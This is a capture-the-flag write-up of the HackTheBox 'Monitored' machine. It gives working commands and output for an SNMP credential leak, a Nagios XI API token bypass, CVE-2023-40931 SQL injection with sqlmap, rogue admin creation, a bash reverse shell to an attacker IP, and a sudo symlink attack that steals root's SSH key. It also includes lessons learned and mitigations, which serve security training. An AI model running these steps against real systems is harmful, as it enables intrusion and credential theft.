# Monitored — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Monitored |
| OS | Linux |
| Difficulty | Medium |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.230.96` |
| Domain | `nagios.monitored.htb` |
| Tools Used | Nmap, snmpwalk, curl, Firefox, Burp Suite, sqlmap, nc |
| CVEs | CVE-2023-40931 (Nagios XI SQLi in `banner_message-ajaxhelper.php`) |
| Date | September 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Step 1 — Reconnaissance](#step-1--reconnaissance)
- [Step 2 — UDP Scan](#step-2--udp-scan)
- [Step 3 — SNMP Credential Leak via snmpwalk](#step-3--snmp-credential-leak-via-snmpwalk)
- [Step 4 — Bypass Disabled Account via Nagios API](#step-4--bypass-disabled-account-via-nagios-api)
- [Step 5 — SQL Injection — CVE-2023-40931](#step-5--sql-injection--cve-2023-40931)
- [Step 6 — Create Admin Account via Nagios API](#step-6--create-admin-account-via-nagios-api)
- [Step 7 — Remote Code Execution via Nagios Command Injection](#step-7--remote-code-execution-via-nagios-command-injection)
- [Step 8 — User Flag](#step-8--user-flag)
- [Step 9 — Privilege Enumeration](#step-9--privilege-enumeration)
- [Step 10 — Analyse getprofile.sh](#step-10--analyse-getprofilesh)
- [Step 11 — Privilege Escalation — Symlink Attack via getprofile.sh](#step-11--privilege-escalation--symlink-attack-via-getprofilesh)
- [Step 12 — SSH as root — Root Flag](#step-12--ssh-as-root--root-flag)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

```
SNMP UDP 161 (community: public) -> svc:XjH7VCehowpR1xZB credential leak
        ↓
Nagios API /authenticate -> disabled account bypass -> auth token issued
        ↓
Nagios XI 5.11.0 dashboard access via ?token= URL parameter
        ↓
CVE-2023-40931 SQLi (banner_message-ajaxhelper.php) -> nagiosadmin API key
        ↓
Admin account creation via API key -> full dashboard access as tcg
        ↓
Configure -> check command ashell (bash reverse shell) -> Run check command
        ↓
nagios shell on 10.129.230.96
        ↓
sudo -l -> getprofile.sh (NOPASSWD) -> phpmailer.log symlink -> /root/.ssh/id_rsa
        ↓
Root SSH private key extracted -> SSH as root -> root flag
```

---

## Step 1 — Reconnaissance

**Goal:** Identify all open TCP ports and services on the target.

### Phase 1 — Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate=1000 -T4 10.129.230.96
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-26 17:01 BST
Nmap scan report for 10.129.230.96
Host is up (0.028s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  tcpwrapped
Nmap done: 1 IP address (1 host up) scanned in 56.24 seconds
```

### Phase 2 — Version and Script Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p22,80,389,443,5667 -sC -sV 10.129.230.96
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56
| http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.56 ((Debian))
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored
| ssl-cert: Subject Alternative Names: nagios.monitored.htb
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux
```

### Output Analysis

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 8.4p1 | SSH — entry point once credentials obtained |
| 80 | Apache 2.4.56 | Redirects to `https://nagios.monitored.htb/` — add to hosts |
| 389 | OpenLDAP | LDAP — low value without credentials |
| 443 | Apache HTTPS | Nagios XI running here — primary target |
| 5667 | tcpwrapped | NRPE (Nagios Remote Plugin Executor) |

### Add Virtual Hostname to /etc/hosts

```bash
Hackerpatel007_1@htb[/htb]$ sudo sh -c 'echo "10.129.230.96 nagios.monitored.htb" >> /etc/hosts'
```

Browsed to `https://nagios.monitored.htb/nagiosxi/` — Nagios XI login page confirmed. No credentials available yet. Without knowing the Nagios version, exploit research is premature. The next step is deeper enumeration — specifically UDP ports, which TCP scans miss entirely.

---

## Step 2 — UDP Scan

**Goal:** Identify UDP services that may expose additional information or attack surface.

Standard nmap TCP scans never touch UDP. Services like SNMP (161), DNS (53), and NTP (123) run exclusively over UDP and are frequently overlooked.

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sU --top-ports 10 -sV 10.129.230.96
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-26 17:08 BST
Nmap scan report for nagios.monitored.htb (10.129.230.96)
Host is up (0.029s latency).
PORT    STATE         SERVICE VERSION
53/udp  closed        domain
67/udp  closed        dhcps
123/udp closed        ntp
135/udp closed        msrpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp closed        snmptrap
Nmap done: 1 IP address (1 host up) scanned in 4.53 seconds
```

**Port 161/UDP — SNMP is open.** SNMP (Simple Network Management Protocol) exposes device configuration, running processes, installed software, and — critically — command-line arguments of running processes. The community string `public` is the default read-only string for SNMPv2c and is accepted here, meaning no authentication is required to query it.

---

## Step 3 — SNMP Credential Leak via snmpwalk

**Goal:** Extract sensitive information from the SNMP service, particularly running process command-line arguments.

SNMP's `hrSWRunParameters` OID tree (`1.3.6.1.2.1.25.4.2.1.5`) exposes the full command-line string of every running process — including arguments. When a script is invoked with credentials as arguments, those credentials are visible to anyone who can query SNMP with the community string. This is a common real-world misconfiguration.

```bash
Hackerpatel007_1@htb[/htb]$ snmpwalk -v 2c -c public nagios.monitored.htb 1.3.6.1.2.1.25.4.2.1.5
```

```
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: ""
iso.3.6.1.2.1.25.4.2.1.5.519 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.717 = STRING: ""
<SNIP>
```

**Credentials extracted:**

| Username | Password |
|----------|---------|
| svc | XjH7VCehowpR1xZB |

---

## Step 4 — Bypass Disabled Account via Nagios API

**Goal:** Use the Nagios REST API to obtain an authentication token for the disabled `svc` account and access the dashboard.

Attempting to log in at `https://nagios.monitored.htb/nagiosxi/` with `svc:XjH7VCehowpR1xZB` returned:

```
Your account has been disabled. Please contact your administrator.
```

The account exists and the password is correct — but the account has been disabled in Nagios XI. The web UI enforces the disabled flag, but the API authentication endpoint does not. The REST API generates a time-limited auth token even for disabled accounts:

```bash
Hackerpatel007_1@htb[/htb]$ curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' \
  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```

```json
{"username":"svc","user_id":"2","auth_token":"0f04a03bdc42d65e2faa0af96fd3b15a","valid_min":5,"valid_until":"Thu, 26 Sep 2026 17:14:28 -0400"}
```

The Nagios XI dashboard accepts this token directly as a URL parameter, bypassing the web login entirely:

```
https://nagios.monitored.htb/nagiosxi/index.php?token=0f04a03bdc42d65e2faa0af96fd3b15a
```

Browsed to this URL — full Nagios XI dashboard accessed as `svc`. The footer confirmed: **Nagios XI 5.11.0**.

> **Key insight:** Nagios XI accepts `?token=<value>` as a URL parameter on any page. This means a valid API token grants full dashboard access without ever touching the login page or its account-disabled check — a design flaw common in applications that bolt tokens onto existing session-based auth.

---

## Step 5 — SQL Injection — CVE-2023-40931

**Goal:** Exploit the SQL injection vulnerability in the announcement banner endpoint to extract the administrator API key from the database.

### Vulnerability Background — CVE-2023-40931

Nagios XI 5.11.1 and prior contains a SQL injection vulnerability in `/nagiosxi/admin/banner_message-ajaxhelper.php`. When a user acknowledges an announcement banner, a POST request is sent with `action=acknowledge_banner_message&id=<N>`. The `id` parameter is passed directly into a SQL query without sanitisation. An authenticated user — even with minimal privileges like `svc` — can inject arbitrary SQL and retrieve data from the backend MySQL database, including API tokens, password hashes, and session cookies from the `xi_users` and `xi_sessions` tables.

### Confirming the Vulnerability in Burp Suite

Captured a banner acknowledgment request in Burp Suite, converted to POST, and sent to Repeater:

```
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=<session_cookie>
Content-Type: application/x-www-form-urlencoded

action=acknowledge_banner_message&id=3*
```

Response:

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server
version for the right syntax to use near '*' at line 1
```

SQL error confirmed — the `id` parameter is injected directly into a query. sqlmap was used to automate exploitation.

### Step 1 — Enumerate Databases

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" \
  --batch -p id \
  --cookie="nagiosxi=<session_cookie>" \
  --dbs --threads=10
```

```
available databases [3]:
[*] information_schema
[*] nagiosxi
[*] performance_schema
```

### Step 2 — Enumerate Tables in the nagiosxi Database

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" \
  --batch -p id \
  --cookie="nagiosxi=<session_cookie>" \
  -D nagiosxi --tables --threads=10
```

```
[24 tables]
+------------------------------+
| xi_users                     |
| xi_sessions                  |
| xi_events                    |
| xi_commands                  |
<SNIP>
+------------------------------+
```

`xi_users` is the target — it contains usernames, emails, password hashes, and API keys.

### Step 3 — Dump the xi_users Table

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" \
  --batch -p id \
  --cookie="nagiosxi=<session_cookie>" \
  -D nagiosxi -T xi_users --dump --threads=10
```

```
+---------+-------------+--------------------------------------------------------------+------------------------------------------------------------------+
| user_id | username    | password                                                     | api_key                                                          |
+---------+-------------+--------------------------------------------------------------+------------------------------------------------------------------+
| 1       | nagiosadmin | $2y$10$<bcrypt_hash>                                         | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |
| 2       | svc         | $2y$10$<bcrypt_hash>                                         | HudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLS |
+---------+-------------+--------------------------------------------------------------+------------------------------------------------------------------+
```

Password hashes from the dump were uncrackable. However, the `nagiosadmin` API key is directly usable — Nagios XI's REST API accepts API keys for privileged operations without requiring a password.

**nagiosadmin API key:** `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`

> **Key insight:** API keys are more powerful than passwords when hashes are uncrackable. Always dump the `api_key` column alongside password columns — they are frequently more immediately useful.

---

## Step 6 — Create Admin Account via Nagios API

**Goal:** Use the extracted administrator API key to create a new admin user account.

The Nagios XI API allows creating users when authenticated with an admin API key, bypassing the web UI entirely:

```bash
Hackerpatel007_1@htb[/htb]$ curl -k --silent \
  "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \
  -d "username=tcg&password=YoullNeverGuessThis&name=TCG&email=tcg@localhost&auth_level=admin"
```

```json
{"success":"User account tcg was added successfully!","user_id":6}
```

**New admin account created:**

| Username | Password | Level |
|----------|----------|-------|
| tcg | YoullNeverGuessThis | admin |

Logged into the Nagios XI dashboard as `tcg` — full administrative access confirmed.

---

## Step 7 — Remote Code Execution via Nagios Command Injection

**Goal:** Abuse the Nagios XI command execution feature to run a reverse shell on the server.

Nagios XI allows administrators to define custom check commands that are executed on the host running Nagios. This is a legitimate monitoring feature — but with admin access, it is a direct OS command execution primitive.

### Step 1 — Create the Reverse Shell Command

Navigated to **Configure → Core Config Manager → Commands → Add New**.

| Field | Value |
|-------|-------|
| Command Name | `ashell` |
| Command Line | `/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'` |
| Command Type | check command |

Clicked **Save**, then **Apply Configuration** to write the command to Nagios config files.

### Step 2 — Start Listener

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvvp 4444
```

```
Listening on 0.0.0.0 4444
```

### Step 3 — Trigger Execution

Navigated to **Monitoring → Hosts → localhost → Check Settings**. Set **Check Command** to `ashell`. Clicked **Run check command**.

Nagios executed the check command on the local host — the bash reverse shell connected back:

```
Connection received on 10.129.230.96 59234
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$
```

Shell obtained as `nagios`.

---

## Step 8 — User Flag

**Goal:** Capture the user flag.

```bash
nagios@monitored:~$ cat /home/nagios/user.txt
```

```
HTB{flag_redacted}
```

---

## Step 9 — Privilege Enumeration

**Goal:** Identify privilege escalation vectors available to the `nagios` user.

```bash
nagios@monitored:~$ sudo -l
```

```
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/nagioxi start
    (root) NOPASSWD: /etc/init.d/nagioxi stop
    (root) NOPASSWD: /etc/init.d/nagioxi restart
    (root) NOPASSWD: /etc/init.d/nagioxi reload
    (root) NOPASSWD: /etc/init.d/nagioxi status
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/repair_databases.sh
```

Most entries are Nagios service management commands — limited value. The interesting entry:

```
(root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
```

This script runs as root with no password and takes user-controlled arguments. Reading its source reveals the vulnerability.

---

## Step 10 — Analyse getprofile.sh

**Goal:** Understand what `getprofile.sh` does and identify how to exploit it.

```bash
nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/components/getprofile.sh
```

Relevant excerpt:

```bash
#!/bin/bash
PROFILE_FOLDER="/usr/local/nagiosxi/var/components/profile/$1"
mkdir -p $PROFILE_FOLDER

# ... various log collection steps ...

# Collect phpmailer log
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "$PROFILE_FOLDER/phpmailer.log"
fi

cd /usr/local/nagiosxi/var/components/profile
zip -r profile.zip $1
cp profile.zip /tmp/profile.zip
```

**What this script does:** It collects various Nagios logs and configuration files, packages them into a profile directory named after the `$1` argument, and zips the result into a `profile.zip` file. One of the files it collects is `/usr/local/nagiosxi/tmp/phpmailer.log` — it copies the last 100 lines of that file into the profile directory using `tail`.

**The vulnerability:** The script checks whether `/usr/local/nagiosxi/tmp/phpmailer.log` exists using `-f` (test for regular file), and if it does, runs `tail -100` on it and writes the output to the profile folder. It does **not** check whether that path is a symlink. If a symlink named `phpmailer.log` is placed at that location, the script will follow the symlink and tail the file it points to — even if the target is `/root/.ssh/id_rsa`.

### Verify the tmp/ Directory is Writable

```bash
nagios@monitored:~$ ls -la /usr/local/nagiosxi/tmp/
```

```
total 8
drwxrwxr-x 2 nagios nagios 4096 Nov 11  2023 .
drwxr-xr-x 8 nagios nagios 4096 Nov 11  2023 ..
```

The `tmp/` directory is writable by the `nagios` group — and `nagios@monitored` is in that group. The `phpmailer.log` file itself does not exist, so creating a symlink there is permitted.

### Verify SSH Configuration

```bash
nagios@monitored:~$ cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
```

```
PermitRootLogin prohibit-password
PubkeyAuthentication yes
```

- **PermitRootLogin prohibit-password** — root can log in via SSH, but only with a key (password login disabled)
- **PubkeyAuthentication yes** — SSH key authentication is enabled

If root has a private key at `/root/.ssh/id_rsa`, extracting it enables direct SSH login as root.

---

## Step 11 — Privilege Escalation — Symlink Attack via getprofile.sh

**Goal:** Plant a symlink at the `phpmailer.log` path to redirect `getprofile.sh`'s file copy to read root's SSH private key.

**Attack plan:**
1. Create a symlink at `/usr/local/nagiosxi/tmp/phpmailer.log` pointing to `/root/.ssh/id_rsa`
2. Run `getprofile.sh` as root via sudo — the `-f` check passes (symlinks pass regular file tests), `tail` follows the symlink and reads `id_rsa`, output lands in the profile directory
3. Unzip the resulting profile archive and extract the key

### Step 1 — Create the Symlink

```bash
nagios@monitored:~$ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
```

### Step 2 — Run getprofile.sh as Root

```bash
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
```

```
  adding: 1/ (stored 0%)
  adding: 1/phpmailer.log (deflated 27%)
  adding: 1/nagiosql.log (stored 0%)
<SNIP>
```

The script ran, found the symlink at `phpmailer.log`, passed the `-f` check (symlinks pass regular file tests), and copied the contents of `/root/.ssh/id_rsa` into the profile directory inside the zip.

### Step 3 — Extract and Read the Key

```bash
nagios@monitored:~$ cp /tmp/profile.zip /tmp/ && cd /tmp && unzip profile.zip
nagios@monitored:/tmp$ cat profile-*/phpmailer.log
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA...
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

Root's SSH private key extracted successfully.

---

## Step 12 — SSH as root — Root Flag

**Goal:** Use the extracted root private key to authenticate via SSH and capture the root flag.

Saved the key content to a local file on the attacker machine:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa
Hackerpatel007_1@htb[/htb]$ ssh root@nagios.monitored.htb -i id_rsa
```

```
Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64

root@monitored:~#
```

```bash
root@monitored:~# cat /root/root.txt
```

```
HTB{flag_redacted}
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `HTB{flag_redacted}` |
| Root Flag | `HTB{flag_redacted}` |

---

## Lessons Learned

1. **Always run a UDP scan — SNMP on port 161 is a credential goldmine.** TCP-only nmap scans silently miss UDP services. SNMP with the default `public` community string exposes every running process and its full command-line arguments, including passwords passed as script arguments. In real assessments, `snmpwalk -v 2c -c public <target>` should be a reflex whenever UDP 161 is open.

2. **API endpoints often do not enforce the same restrictions as the web UI.** The web login rejected `svc` because the account was disabled. The API `/authenticate` endpoint had no such check and issued a valid token anyway. When web UI access is blocked, always test the underlying API directly — the authentication model may differ significantly.

3. **The auth token URL parameter is a session bypass, not just a convenience feature.** Nagios XI accepts `?token=<value>` as a URL parameter on any page. This means a valid API token grants full dashboard access without ever touching the login page or its account-disabled check. This is a design flaw common in applications that bolt tokens onto existing session-based auth.

4. **CVE-2023-40931 — authenticated SQLi in a "low privilege" endpoint.** The banner acknowledgment endpoint was accessible to the `svc` account — a service account with minimal UI privileges. The SQL injection in the `id` parameter gave read access to the entire Nagios XI database, including admin API keys. The principle of least privilege was violated both at the SQL layer and at the application layer.

5. **API keys are more powerful than passwords when hashes are uncrackable.** The `nagiosadmin` password hash from `xi_users` was uncrackable. But the `api_key` column returned in the same dump allowed direct admin API calls without any brute force. Always dump API key columns alongside password columns — they are frequently more immediately useful.

6. **The `-f` file test in bash follows symlinks — always.** `[ -f /path/to/file ]` returns true if the path resolves to a regular file — including through a symlink chain. A script that checks for a file's existence with `-f` and then reads it provides no protection against symlink attacks. The correct mitigation is to use `-f` in combination with `-L` (is it a symlink?) and reject symlinks, or to use `realpath` to resolve the canonical path before operating on it.

7. **sudo scripts that copy or read files as root are always symlink candidates.** Any script running as root that copies, reads, or executes a file at a path writable by a lower-privilege user is vulnerable to symlink substitution. The writable `tmp/` directory + the absent `phpmailer.log` + the unvalidated `tail` operation = a complete symlink escalation path. When reviewing sudo entries, trace every file operation to its directory and check permissions.

8. **PermitRootLogin prohibit-password + readable root SSH key = full compromise.** SSH root login was restricted to key-based auth — a common hardening measure. But if an attacker can extract the private key through any means (symlink, LFI, path traversal, readable backup), that hardening is irrelevant. Key material must be protected with the same priority as passwords.

---

## Full Attack Chain Reference

```
Ran nmap -p- --min-rate=1000 then targeted scan
  -> identified SSH (22), HTTP (80), LDAP (389), HTTPS Nagios XI (443), NRPE (5667)
Added 10.129.230.96 nagios.monitored.htb to /etc/hosts
Browsed https://nagios.monitored.htb/nagiosxi/ -> Nagios XI login, no credentials
Ran sudo nmap -sU --top-ports 10 -sV -> found SNMP on UDP 161 (public community)
Ran snmpwalk -v 2c -c public nagios.monitored.htb 1.3.6.1.2.1.25.4.2.1.5
  -> found svc:XjH7VCehowpR1xZB in process arguments
Attempted web login as svc -> account disabled error
POST to /nagiosxi/api/v1/authenticate with svc credentials -> auth token returned
Accessed dashboard via ?token=<auth_token> URL -> Nagios XI 5.11.0 confirmed
Sent POST to banner_message-ajaxhelper.php with id=3* in Burp -> SQL error confirmed
Ran sqlmap with session cookie -> enumerated information_schema and nagiosxi databases
Dumped xi_users table -> extracted nagiosadmin API key
POST to /nagiosxi/api/v1/system/user?apikey=<nagiosadmin_key> -> created admin account tcg
Logged in as tcg -> full admin dashboard access
Navigated to Configure -> Commands -> created ashell command with bash reverse shell payload
Applied configuration
Started nc -lvvp 4444 listener
Navigated to Monitoring -> Hosts -> localhost -> set Check Command to ashell -> Run check command
Reverse shell received as nagios
Captured user flag from /home/nagios/user.txt
Ran sudo -l -> found getprofile.sh NOPASSWD
Read getprofile.sh source -> identified tail of phpmailer.log without symlink validation
Confirmed tmp/ directory is writable by nagios group
Confirmed PubkeyAuthentication yes and PermitRootLogin prohibit-password in sshd_config
Created symlink: ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
Ran sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
  -> key copied into profile zip
Copied profile.zip to /tmp -> unzipped -> read phpmailer.log -> root's SSH private key
Saved key locally, chmod 600 id_rsa
SSH'd as root@nagios.monitored.htb -i id_rsa -> root shell obtained
Captured root flag from /root/root.txt
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -p- --min-rate=1000 -T4 10.129.230.96` | Fast full TCP port scan |
| `nmap -p22,80,389,443,5667 -sC -sV 10.129.230.96` | Targeted version and script scan |
| `sudo nmap -sU --top-ports 10 -sV 10.129.230.96` | UDP scan for SNMP and other UDP services |
| `snmpwalk -v 2c -c public nagios.monitored.htb 1.3.6.1.2.1.25.4.2.1.5` | Enumerate process command-line arguments via SNMP |
| `curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'` | Obtain auth token for disabled account via API |
| `https://nagios.monitored.htb/nagiosxi/index.php?token=<token>` | Access dashboard bypassing web login |
| `sqlmap -u "...banner_message-ajaxhelper.php?...&id=3" --batch -p id --cookie="nagiosxi=<cookie>" --dbs --threads=10` | Enumerate databases via SQLi |
| `sqlmap ... -D nagiosxi -T xi_users --dump` | Dump xi_users table for API keys |
| `curl -k --silent "...api/v1/system/user?apikey=<key>" -d "username=tcg&password=YoullNeverGuessThis&name=TCG&email=tcg@localhost&auth_level=admin"` | Create admin account via API key |
| `nc -lvvp 4444` | Start listener for reverse shell |
| `sudo -l` | Check nagios user sudo permissions |
| `cat /usr/local/nagiosxi/scripts/components/getprofile.sh` | Read vulnerable script source |
| `cat /etc/ssh/sshd_config \| grep -E 'PermitRootLogin\|PubkeyAuthentication'` | Verify SSH key auth and root login settings |
| `ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log` | Plant symlink at file path read by getprofile.sh |
| `sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1` | Trigger root execution — follows symlink, copies id_rsa |
| `unzip /tmp/profile.zip && cat profile-*/phpmailer.log` | Extract root SSH key from profile archive |
| `chmod 600 id_rsa && ssh root@nagios.monitored.htb -i id_rsa` | SSH as root using extracted private key |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|---------|
| Network Service Discovery | T1046 | UDP scan discovered SNMP on port 161 |
| Unsecured Credentials — Credentials in Files | T1552.001 | SNMP process table leaked `svc` credentials from bash script arguments |
| Exploit Public-Facing Application | T1190 | CVE-2023-40931 SQL injection in Nagios XI banner endpoint |
| Valid Accounts | T1078.003 | API token bypass for disabled account; admin account created via stolen API key |
| Command and Scripting Interpreter | T1059.004 | Bash reverse shell registered as Nagios check command and triggered via Run check |
| Exploitation for Privilege Escalation | T1068 | Symlink attack via sudo getprofile.sh — root reads attacker-controlled symlink → id_rsa leaked |
| Unsecured Credentials — Private Keys | T1552.004 | Root SSH private key extracted from getprofile.sh symlink output |
| Remote Services — SSH | T1021.004 | Root SSH login using extracted private key |

---

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
